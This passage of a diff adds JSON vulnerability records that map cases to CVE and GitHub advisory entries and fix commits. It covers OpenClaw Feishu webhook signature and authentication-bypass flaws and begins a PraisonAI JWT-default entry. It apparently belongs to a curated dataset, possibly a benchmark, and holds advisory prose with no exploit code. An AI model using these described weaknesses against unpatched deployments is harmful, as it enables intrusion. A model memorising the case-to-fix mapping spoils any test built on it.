+                    "baseSeverity": "HIGH",
+                    "privilegesRequired": "NONE",
+                    "subAvailabilityImpact": "NONE",
+                    "subConfidentialityImpact": "NONE",
+                    "subIntegrityImpact": "NONE",
+                    "userInteraction": "NONE",
+                    "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N",
+                    "version": "4.0",
+                    "vulnAvailabilityImpact": "LOW",
+                    "vulnConfidentialityImpact": "LOW",
+                    "vulnIntegrityImpact": "HIGH"
+                  },
+                  "format": "CVSS"
+                }
+              ],
+              "problemTypes": [
+                {
+                  "descriptions": [
+                    {
+                      "cweId": "CWE-347",
+                      "description": "Improper Verification of Cryptographic Signature",
+                      "lang": "en",
+                      "type": "CWE"
+                    }
+                  ]
+                }
+              ],
+              "providerMetadata": {
+                "dateUpdated": "2026-06-23T16:15:26.056Z",
+                "orgId": "83251b91-4cc7-4094-a5c7-464a1b83ea10",
+                "shortName": "VulnCheck"
+              },
+              "references": [
+                {
+                  "name": "GitHub Security Advisory (GHSA-g353-mgv3-8pcj)",
+                  "tags": [
+                    "vendor-advisory"
+                  ],
+                  "url": "https://github.com/openclaw/openclaw/security/advisories/GHSA-g353-mgv3-8pcj"
+                },
+                {
+                  "name": "VulnCheck Advisory: OpenClaw < 2026.3.12 - Forged Event Injection via Feishu Webhook Verification Token",
+                  "tags": [
+                    "third-party-advisory"
+                  ],
+                  "url": "https://www.vulncheck.com/advisories/openclaw-forged-event-injection-via-feishu-webhook-verification-token"
+                }
+              ],
+              "title": "OpenClaw < 2026.3.12 - Forged Event Injection via Feishu Webhook Verification Token",
+              "x_generator": {
+                "engine": "vulncheck"
+              }
+            }
+          },
+          "cveMetadata": {
+            "assignerOrgId": "83251b91-4cc7-4094-a5c7-464a1b83ea10",
+            "assignerShortName": "VulnCheck",
+            "cveId": "CVE-2026-32974",
+            "datePublished": "2026-03-29T12:44:26.283Z",
+            "dateReserved": "2026-03-17T11:31:33.584Z",
+            "dateUpdated": "2026-06-23T16:15:26.056Z",
+            "state": "PUBLISHED"
+          },
+          "dataType": "CVE_RECORD",
+          "dataVersion": "5.2"
+        }
+      },
+      "CVE-2026-44109": {
+        "cve": {
+          "containers": {
+            "adp": [
+              {
+                "metrics": [
+                  {
+                    "other": {
+                      "content": {
+                        "id": "CVE-2026-44109",
+                        "options": [
+                          {
+                            "Exploitation": "none"
+                          },
+                          {
+                            "Automatable": "yes"
+                          },
+                          {
+                            "Technical Impact": "total"
+                          }
+                        ],
+                        "role": "CISA Coordinator",
+                        "timestamp": "2026-05-07T12:34:48.808247Z",
+                        "version": "2.0.3"
+                      },
+                      "type": "ssvc"
+                    }
+                  }
+                ],
+                "providerMetadata": {
+                  "dateUpdated": "2026-05-07T12:35:11.405Z",
+                  "orgId": "134c704f-9b21-4f2e-91b3-4a467353bcc0",
+                  "shortName": "CISA-ADP"
+                },
+                "title": "CISA ADP Vulnrichment"
+              }
+            ],
+            "cna": {
+              "affected": [
+                {
+                  "defaultStatus": "unaffected",
+                  "packageURL": "pkg:npm/openclaw",
+                  "product": "OpenClaw",
+                  "vendor": "OpenClaw",
+                  "versions": [
+                    {
+                      "lessThan": "2026.4.15",
+                      "status": "affected",
+                      "version": "0",
+                      "versionType": "semver"
+                    },
+                    {
+                      "status": "unaffected",
+                      "version": "2026.4.15",
+                      "versionType": "semver"
+                    }
+                  ]
+                }
+              ],
+              "cpeApplicability": [
+                {
+                  "nodes": [
+                    {
+                      "cpeMatch": [
+                        {
+                          "criteria": "cpe:2.3:a:openclaw:openclaw:*:*:*:*:*:node.js:*:*",
+                          "versionEndExcluding": "2026.4.15",
+                          "vulnerable": true
+                        }
+                      ],
+                      "operator": "OR"
+                    }
+                  ]
+                }
+              ],
+              "credits": [
+                {
+                  "lang": "en",
+                  "type": "reporter",
+                  "value": "dhyabi2"
+                }
+              ],
+              "datePublic": "2026-04-16T00:00:00.000Z",
+              "descriptions": [
+                {
+                  "lang": "en",
+                  "value": "OpenClaw before 2026.4.15 contains an authentication bypass vulnerability in Feishu webhook and card-action validation that allows unauthenticated requests to reach command dispatch. Missing encryptKey configuration and blank callback tokens fail open instead of rejecting requests, enabling attackers to bypass signature verification and replay protection to execute arbitrary commands."
+                }
+              ],
+              "metrics": [
+                {
+                  "cvssV4_0": {
+                    "Automatable": "NOT_DEFINED",
+                    "Recovery": "NOT_DEFINED",
+                    "Safety": "NOT_DEFINED",
+                    "attackComplexity": "LOW",
+                    "attackRequirements": "PRESENT",
+                    "attackVector": "NETWORK",
+                    "baseScore": 9.2,
+                    "baseSeverity": "CRITICAL",
+                    "exploitMaturity": "NOT_DEFINED",
+                    "privilegesRequired": "NONE",
+                    "providerUrgency": "NOT_DEFINED",
+                    "subAvailabilityImpact": "NONE",
+                    "subConfidentialityImpact": "NONE",
+                    "subIntegrityImpact": "NONE",
+                    "userInteraction": "NONE",
+                    "valueDensity": "NOT_DEFINED",
+                    "vectorString": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+                    "version": "4.0",
+                    "vulnAvailabilityImpact": "HIGH",
+                    "vulnConfidentialityImpact": "HIGH",
+                    "vulnIntegrityImpact": "HIGH",
+                    "vulnerabilityResponseEffort": "NOT_DEFINED"
+                  },
+                  "format": "CVSS",
+                  "scenarios": [
+                    {
+                      "lang": "en",
+                      "value": "GENERAL"
+                    }
+                  ]
+                },
+                {
+                  "cvssV3_1": {
+                    "attackComplexity": "LOW",
+                    "attackVector": "NETWORK",
+                    "availabilityImpact": "HIGH",
+                    "baseScore": 9.8,
+                    "baseSeverity": "CRITICAL",
+                    "confidentialityImpact": "HIGH",
+                    "integrityImpact": "HIGH",
+                    "privilegesRequired": "NONE",
+                    "scope": "UNCHANGED",
+                    "userInteraction": "NONE",
+                    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+                    "version": "3.1"
+                  },
+                  "format": "CVSS",
+                  "scenarios": [
+                    {
+                      "lang": "en",
+                      "value": "GENERAL"
+                    }
+                  ]
+                }
+              ],
+              "problemTypes": [
+                {
+                  "descriptions": [
+                    {
+                      "cweId": "CWE-1188",
+                      "description": "CWE-1188 Initialization of a Resource with an Insecure Default",
+                      "lang": "en",
+                      "type": "CWE"
+                    }
+                  ]
+                }
+              ],
+              "providerMetadata": {
+                "dateUpdated": "2026-05-06T19:49:27.637Z",
+                "orgId": "83251b91-4cc7-4094-a5c7-464a1b83ea10",
+                "shortName": "VulnCheck"
+              },
+              "references": [
+                {
+                  "name": "GitHub Security Advisory (GHSA-xh72-v6v9-mwhc)",
+                  "tags": [
+                    "vendor-advisory"
+                  ],
+                  "url": "https://github.com/openclaw/openclaw/security/advisories/GHSA-xh72-v6v9-mwhc"
+                },
+                {
+                  "name": "Patch Commit",
+                  "tags": [
+                    "patch"
+                  ],
+                  "url": "https://github.com/openclaw/openclaw/commit/c8003f1b33ed2924be5f62131bd28742c5a41aae"
+                },
+                {
+                  "name": "VulnCheck Advisory: OpenClaw < 2026.4.15 - Authentication Bypass in Feishu Webhook and Card-Action Validation",
+                  "tags": [
+                    "third-party-advisory"
+                  ],
+                  "url": "https://www.vulncheck.com/advisories/openclaw-authentication-bypass-in-feishu-webhook-and-card-action-validation"
+                }
+              ],
+              "tags": [
+                "x_open-source"
+              ],
+              "title": "OpenClaw < 2026.4.15 - Authentication Bypass in Feishu Webhook and Card-Action Validation",
+              "x_generator": {
+                "engine": "vulncheck"
+              }
+            }
+          },
+          "cveMetadata": {
+            "assignerOrgId": "83251b91-4cc7-4094-a5c7-464a1b83ea10",
+            "assignerShortName": "VulnCheck",
+            "cveId": "CVE-2026-44109",
+            "datePublished": "2026-05-06T19:49:27.637Z",
+            "dateReserved": "2026-05-05T11:30:46.259Z",
+            "dateUpdated": "2026-05-07T12:35:11.405Z",
+            "state": "PUBLISHED"
+          },
+          "dataType": "CVE_RECORD",
+          "dataVersion": "5.2"
+        }
+      },
+      "GHSA-G353-MGV3-8PCJ": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/129816813?v=4",
+                "events_url": "https://api.github.com/users/lintsinghua/events{/privacy}",
+                "followers_url": "https://api.github.com/users/lintsinghua/followers",
+                "following_url": "https://api.github.com/users/lintsinghua/following{/other_user}",
+                "gists_url": "https://api.github.com/users/lintsinghua/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/lintsinghua",
+                "id": 129816813,
+                "login": "lintsinghua",
+                "node_id": "U_kgDOB7zY7Q",
+                "organizations_url": "https://api.github.com/users/lintsinghua/orgs",
+                "received_events_url": "https://api.github.com/users/lintsinghua/received_events",
+                "repos_url": "https://api.github.com/users/lintsinghua/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/lintsinghua/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/lintsinghua/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/lintsinghua",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-32974",
+          "cvss": {
+            "score": 8.6,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 8.6,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-347",
+              "name": "Improper Verification of Cryptographic Signature"
+            }
+          ],
+          "description": "### Summary\n\nFeishu webhook mode allowed deployments that configured only `verificationToken` without `encryptKey`. In that state, forged inbound events could be accepted because the weaker configuration did not provide the required cryptographic verification boundary.\n\n### Impact\n\nAn unauthenticated network attacker who could reach the webhook endpoint could inject forged Feishu events, impersonate senders, and potentially trigger downstream tool execution subject to the local agent policy.\n\n### Affected versions\n\n`openclaw` `<= 2026.3.11`\n\n### Patch\n\nFixed in `openclaw` `2026.3.12`. Feishu webhook mode now fails closed unless `encryptKey` is configured, and the webhook transport rejects missing or invalid signatures before dispatch. Update to `2026.3.12` or later and configure `encryptKey` for webhook deployments.",
+          "epss": {
+            "percentage": 0.00247,
+            "percentile": 0.15687
+          },
+          "ghsa_id": "GHSA-g353-mgv3-8pcj",
+          "github_reviewed_at": "2026-03-13T20:55:34Z",
+          "html_url": "https://github.com/advisories/GHSA-g353-mgv3-8pcj",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-g353-mgv3-8pcj"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-32974"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-03-13T20:55:34Z",
+          "references": [
+            "https://github.com/openclaw/openclaw/security/advisories/GHSA-g353-mgv3-8pcj",
+            "https://github.com/openclaw/openclaw/pull/44087",
+            "https://github.com/openclaw/openclaw/commit/7844bc89a1612800810617c823eb0c76ef945804",
+            "https://github.com/openclaw/openclaw/releases/tag/v2026.3.12",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-32974",
+            "https://www.vulncheck.com/advisories/openclaw-forged-event-injection-via-feishu-webhook-verification-token",
+            "https://github.com/advisories/GHSA-g353-mgv3-8pcj"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/openclaw/openclaw/security-advisories/GHSA-g353-mgv3-8pcj",
+          "severity": "high",
+          "source_code_location": "https://github.com/openclaw/openclaw",
+          "summary": "OpenClaw: Feishu webhook mode accepted forged events when only `verificationToken` was configured",
+          "type": "reviewed",
+          "updated_at": "2026-04-06T22:32:33Z",
+          "url": "https://api.github.com/advisories/GHSA-g353-mgv3-8pcj",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "2026.3.12",
+              "package": {
+                "ecosystem": "npm",
+                "name": "openclaw"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 2026.3.11"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "lintsinghua",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/129816813?v=4",
+                "events_url": "https://api.github.com/users/lintsinghua/events{/privacy}",
+                "followers_url": "https://api.github.com/users/lintsinghua/followers",
+                "following_url": "https://api.github.com/users/lintsinghua/following{/other_user}",
+                "gists_url": "https://api.github.com/users/lintsinghua/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/lintsinghua",
+                "id": 129816813,
+                "login": "lintsinghua",
+                "node_id": "U_kgDOB7zY7Q",
+                "organizations_url": "https://api.github.com/users/lintsinghua/orgs",
+                "received_events_url": "https://api.github.com/users/lintsinghua/received_events",
+                "repos_url": "https://api.github.com/users/lintsinghua/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/lintsinghua/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/lintsinghua/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/lintsinghua",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": null,
+          "cvss": {
+            "score": 8.6,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 8.6,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L"
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-347"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-347",
+              "name": "Improper Verification of Cryptographic Signature"
+            }
+          ],
+          "description": "### Summary\n\nFeishu webhook mode allowed deployments that configured only `verificationToken` without `encryptKey`. In that state, forged inbound events could be accepted because the weaker configuration did not provide the required cryptographic verification boundary.\n\n### Impact\n\nAn unauthenticated network attacker who could reach the webhook endpoint could inject forged Feishu events, impersonate senders, and potentially trigger downstream tool execution subject to the local agent policy.\n\n### Affected versions\n\n`openclaw` `<= 2026.3.11`\n\n### Patch\n\nFixed in `openclaw` `2026.3.12`. Feishu webhook mode now fails closed unless `encryptKey` is configured, and the webhook transport rejects missing or invalid signatures before dispatch. Update to `2026.3.12` or later and configure `encryptKey` for webhook deployments.\n",
+          "ghsa_id": "GHSA-g353-mgv3-8pcj",
+          "html_url": "https://github.com/openclaw/openclaw/security/advisories/GHSA-g353-mgv3-8pcj",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-g353-mgv3-8pcj"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-03-13T04:34:36Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/58493?v=4",
+            "events_url": "https://api.github.com/users/steipete/events{/privacy}",
+            "followers_url": "https://api.github.com/users/steipete/followers",
+            "following_url": "https://api.github.com/users/steipete/following{/other_user}",
+            "gists_url": "https://api.github.com/users/steipete/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/steipete",
+            "id": 58493,
+            "login": "steipete",
+            "node_id": "MDQ6VXNlcjU4NDkz",
+            "organizations_url": "https://api.github.com/users/steipete/orgs",
+            "received_events_url": "https://api.github.com/users/steipete/received_events",
+            "repos_url": "https://api.github.com/users/steipete/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/steipete/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/steipete/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/steipete",
+            "user_view_type": "public"
+          },
+          "severity": "high",
+          "state": "published",
+          "submission": null,
+          "summary": "Feishu webhook mode accepted forged events when only `verificationToken` was configured",
+          "updated_at": "2026-03-13T04:34:36Z",
+          "url": "https://api.github.com/repos/openclaw/openclaw/security-advisories/GHSA-g353-mgv3-8pcj",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "openclaw"
+              },
+              "patched_versions": "2026.3.12",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "<= 2026.3.11"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      },
+      "GHSA-XH72-V6V9-MWHC": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/32069256?v=4",
+                "events_url": "https://api.github.com/users/dhyabi2/events{/privacy}",
+                "followers_url": "https://api.github.com/users/dhyabi2/followers",
+                "following_url": "https://api.github.com/users/dhyabi2/following{/other_user}",
+                "gists_url": "https://api.github.com/users/dhyabi2/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/dhyabi2",
+                "id": 32069256,
+                "login": "dhyabi2",
+                "node_id": "MDQ6VXNlcjMyMDY5MjU2",
+                "organizations_url": "https://api.github.com/users/dhyabi2/orgs",
+                "received_events_url": "https://api.github.com/users/dhyabi2/received_events",
+                "repos_url": "https://api.github.com/users/dhyabi2/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/dhyabi2/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/dhyabi2/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/dhyabi2",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-44109",
+          "cvss": {
+            "score": 9.8,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 9.8,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            },
+            "cvss_v4": {
+              "score": 9.2,
+              "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-287",
+              "name": "Improper Authentication"
+            },
+            {
+              "cwe_id": "CWE-294",
+              "name": "Authentication Bypass by Capture-replay"
+            },
+            {
+              "cwe_id": "CWE-1188",
+              "name": "Initialization of a Resource with an Insecure Default"
+            }
+          ],
+          "description": "## Summary\n\nFeishu webhook mode accepted missing `encryptKey` configuration as valid and blank card-action callback tokens as usable lifecycle tokens. Together, those fail-open paths could allow unauthenticated webhook or card-action traffic to reach command dispatch in affected deployments.\n\n## Impact\n\nA deployment using Feishu webhook mode without a configured `encryptKey`, or handling malformed card-action callbacks with blank callback tokens, could fail open instead of rejecting the request. Severity remains critical because affected webhook deployments expose a network-triggered path into OpenClaw command handling without the expected Feishu signature or replay protection.\n\n## Affected versions\n\n- Affected: `< 2026.4.15`\n- Patched: `2026.4.15`\n\n## Fix\n\nOpenClaw `2026.4.15` makes Feishu webhook and card-action validation fail closed. Webhook mode now refuses to start without an `encryptKey`, missing signing configuration returns invalid instead of valid, invalid signatures return `401`, and blank card-action callback tokens are rejected before dispatch.\n\nVerified in `v2026.4.15`:\n\n- `extensions/feishu/src/monitor.transport.ts` returns invalid when `encryptKey` is missing, refuses webhook mode without `encryptKey`, and rejects invalid signatures before JSON handling.\n- `extensions/feishu/src/card-action.ts` rejects blank callback tokens in the card-action lifecycle guard.\n- `extensions/feishu/src/monitor.webhook-security.test.ts` covers missing-`encryptKey` startup and transport rejection.\n- `extensions/feishu/src/monitor.card-action.lifecycle.test.ts` covers malformed blank-token card actions being dropped before handler dispatch.\n\nFix commit included in `v2026.4.15` and absent from `v2026.4.14`:\n\n- `c8003f1b33ed2924be5f62131bd28742c5a41aae` via PR #66707\n\nThanks to @dhyabi2 for reporting this issue.",
+          "epss": {
+            "percentage": 0.00718,
+            "percentile": 0.49524
+          },
+          "ghsa_id": "GHSA-xh72-v6v9-mwhc",
+          "github_reviewed_at": "2026-04-17T22:32:47Z",
+          "html_url": "https://github.com/advisories/GHSA-xh72-v6v9-mwhc",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-xh72-v6v9-mwhc"
+            },
+            {
+              "type": "CVE",
+              "value": "CVE-2026-44109"
+            }
+          ],
+          "nvd_published_at": null,
+          "published_at": "2026-04-17T22:32:47Z",
+          "references": [
+            "https://github.com/openclaw/openclaw/security/advisories/GHSA-xh72-v6v9-mwhc",
+            "https://github.com/openclaw/openclaw/pull/66707",
+            "https://github.com/openclaw/openclaw/commit/c8003f1b33ed2924be5f62131bd28742c5a41aae",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-44109",
+            "https://www.vulncheck.com/advisories/openclaw-authentication-bypass-in-feishu-webhook-and-card-action-validation",
+            "https://github.com/advisories/GHSA-xh72-v6v9-mwhc"
+          ],
+          "repository_advisory_url": "https://api.github.com/repos/openclaw/openclaw/security-advisories/GHSA-xh72-v6v9-mwhc",
+          "severity": "critical",
+          "source_code_location": "https://github.com/openclaw/openclaw",
+          "summary": "OpenClaw: Feishu webhook and card-action validation now fail closed",
+          "type": "reviewed",
+          "updated_at": "2026-05-12T13:35:35Z",
+          "url": "https://api.github.com/advisories/GHSA-xh72-v6v9-mwhc",
+          "vulnerabilities": [
+            {
+              "first_patched_version": "2026.4.15",
+              "package": {
+                "ecosystem": "npm",
+                "name": "openclaw"
+              },
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 2026.4.15"
+            }
+          ],
+          "withdrawn_at": null
+        },
+        "repo": {
+          "author": null,
+          "closed_at": null,
+          "collaborating_teams": null,
+          "collaborating_users": null,
+          "created_at": null,
+          "credits": [
+            {
+              "login": "dhyabi2",
+              "type": "reporter"
+            }
+          ],
+          "credits_detailed": [
+            {
+              "state": "accepted",
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/32069256?v=4",
+                "events_url": "https://api.github.com/users/dhyabi2/events{/privacy}",
+                "followers_url": "https://api.github.com/users/dhyabi2/followers",
+                "following_url": "https://api.github.com/users/dhyabi2/following{/other_user}",
+                "gists_url": "https://api.github.com/users/dhyabi2/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/dhyabi2",
+                "id": 32069256,
+                "login": "dhyabi2",
+                "node_id": "MDQ6VXNlcjMyMDY5MjU2",
+                "organizations_url": "https://api.github.com/users/dhyabi2/orgs",
+                "received_events_url": "https://api.github.com/users/dhyabi2/received_events",
+                "repos_url": "https://api.github.com/users/dhyabi2/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/dhyabi2/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/dhyabi2/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/dhyabi2",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": null,
+          "cvss": {
+            "score": null,
+            "vector_string": null
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": null,
+              "vector_string": null
+            },
+            "cvss_v4": {
+              "score": null,
+              "vector_string": null
+            }
+          },
+          "cwe_ids": [
+            "CWE-287",
+            "CWE-294",
+            "CWE-1188"
+          ],
+          "cwes": [
+            {
+              "cwe_id": "CWE-287",
+              "name": "Improper Authentication"
+            },
+            {
+              "cwe_id": "CWE-294",
+              "name": "Authentication Bypass by Capture-replay"
+            },
+            {
+              "cwe_id": "CWE-1188",
+              "name": "Initialization of a Resource with an Insecure Default"
+            }
+          ],
+          "description": "## Summary\n\nFeishu webhook mode accepted missing `encryptKey` configuration as valid and blank card-action callback tokens as usable lifecycle tokens. Together, those fail-open paths could allow unauthenticated webhook or card-action traffic to reach command dispatch in affected deployments.\n\n## Impact\n\nA deployment using Feishu webhook mode without a configured `encryptKey`, or handling malformed card-action callbacks with blank callback tokens, could fail open instead of rejecting the request. Severity remains critical because affected webhook deployments expose a network-triggered path into OpenClaw command handling without the expected Feishu signature or replay protection.\n\n## Affected versions\n\n- Affected: `< 2026.4.15`\n- Patched: `2026.4.15`\n\n## Fix\n\nOpenClaw `2026.4.15` makes Feishu webhook and card-action validation fail closed. Webhook mode now refuses to start without an `encryptKey`, missing signing configuration returns invalid instead of valid, invalid signatures return `401`, and blank card-action callback tokens are rejected before dispatch.\n\nVerified in `v2026.4.15`:\n\n- `extensions/feishu/src/monitor.transport.ts` returns invalid when `encryptKey` is missing, refuses webhook mode without `encryptKey`, and rejects invalid signatures before JSON handling.\n- `extensions/feishu/src/card-action.ts` rejects blank callback tokens in the card-action lifecycle guard.\n- `extensions/feishu/src/monitor.webhook-security.test.ts` covers missing-`encryptKey` startup and transport rejection.\n- `extensions/feishu/src/monitor.card-action.lifecycle.test.ts` covers malformed blank-token card actions being dropped before handler dispatch.\n\nFix commit included in `v2026.4.15` and absent from `v2026.4.14`:\n\n- `c8003f1b33ed2924be5f62131bd28742c5a41aae` via PR #66707\n\nThanks to @dhyabi2 for reporting this issue.\n",
+          "ghsa_id": "GHSA-xh72-v6v9-mwhc",
+          "html_url": "https://github.com/openclaw/openclaw/security/advisories/GHSA-xh72-v6v9-mwhc",
+          "identifiers": [
+            {
+              "type": "GHSA",
+              "value": "GHSA-xh72-v6v9-mwhc"
+            }
+          ],
+          "private_fork": null,
+          "published_at": "2026-04-16T23:40:37Z",
+          "publisher": {
+            "avatar_url": "https://avatars.githubusercontent.com/u/58493?v=4",
+            "events_url": "https://api.github.com/users/steipete/events{/privacy}",
+            "followers_url": "https://api.github.com/users/steipete/followers",
+            "following_url": "https://api.github.com/users/steipete/following{/other_user}",
+            "gists_url": "https://api.github.com/users/steipete/gists{/gist_id}",
+            "gravatar_id": "",
+            "html_url": "https://github.com/steipete",
+            "id": 58493,
+            "login": "steipete",
+            "node_id": "MDQ6VXNlcjU4NDkz",
+            "organizations_url": "https://api.github.com/users/steipete/orgs",
+            "received_events_url": "https://api.github.com/users/steipete/received_events",
+            "repos_url": "https://api.github.com/users/steipete/repos",
+            "site_admin": false,
+            "starred_url": "https://api.github.com/users/steipete/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/steipete/subscriptions",
+            "type": "User",
+            "url": "https://api.github.com/users/steipete",
+            "user_view_type": "public"
+          },
+          "severity": "critical",
+          "state": "published",
+          "submission": null,
+          "summary": "Feishu webhook and card-action validation now fail closed",
+          "updated_at": "2026-04-16T23:40:37Z",
+          "url": "https://api.github.com/repos/openclaw/openclaw/security-advisories/GHSA-xh72-v6v9-mwhc",
+          "vulnerabilities": [
+            {
+              "package": {
+                "ecosystem": "npm",
+                "name": "openclaw"
+              },
+              "patched_versions": "2026.4.15",
+              "vulnerable_functions": [],
+              "vulnerable_version_range": "< 2026.4.15"
+            }
+          ],
+          "withdrawn_at": null
+        }
+      }
+    },
+    "repo": "openclaw/openclaw",
+    "selected_fixes": [
+      "7844bc89a1612800810617c823eb0c76ef945804",
+      "c8003f1b33ed2924be5f62131bd28742c5a41aae"
+    ]
+  },
+  "praisonai-jwt-default@canonical": {
+    "ids": {
+      "CVE-2026-57148": {
+        "cve": {
+          "_error": "HTTP error",
+          "_http_status": 404
+        }
+      },
+      "GHSA-F38V-77QJ-H4JQ": {
+        "global": {
+          "credits": [
+            {
+              "type": "reporter",
+              "user": {
+                "avatar_url": "https://avatars.githubusercontent.com/u/124195190?v=4",
+                "events_url": "https://api.github.com/users/Yanchon918s/events{/privacy}",
+                "followers_url": "https://api.github.com/users/Yanchon918s/followers",
+                "following_url": "https://api.github.com/users/Yanchon918s/following{/other_user}",
+                "gists_url": "https://api.github.com/users/Yanchon918s/gists{/gist_id}",
+                "gravatar_id": "",
+                "html_url": "https://github.com/Yanchon918s",
+                "id": 124195190,
+                "login": "Yanchon918s",
+                "node_id": "U_kgDOB2cRdg",
+                "organizations_url": "https://api.github.com/users/Yanchon918s/orgs",
+                "received_events_url": "https://api.github.com/users/Yanchon918s/received_events",
+                "repos_url": "https://api.github.com/users/Yanchon918s/repos",
+                "site_admin": false,
+                "starred_url": "https://api.github.com/users/Yanchon918s/starred{/owner}{/repo}",
+                "subscriptions_url": "https://api.github.com/users/Yanchon918s/subscriptions",
+                "type": "User",
+                "url": "https://api.github.com/users/Yanchon918s",
+                "user_view_type": "public"
+              }
+            }
+          ],
+          "cve_id": "CVE-2026-57148",
+          "cvss": {
+            "score": 9.8,
+            "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          },
+          "cvss_severities": {
+            "cvss_v3": {
+              "score": 9.8,
+              "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+            },
+            "cvss_v4": {
+              "score": 0.0,
+              "vector_string": null
+            }
+          },
+          "cwes": [
+            {
+              "cwe_id": "CWE-287",
+              "name": "Improper Authentication"
+            },
+            {
+              "cwe_id": "CWE-798",
+              "name": "Use of Hard-coded Credentials"
+            },
+            {
+              "cwe_id": "CWE-1188",
+              "name": "Initialization of a Resource with an Insecure Default"
+            }
+          ],
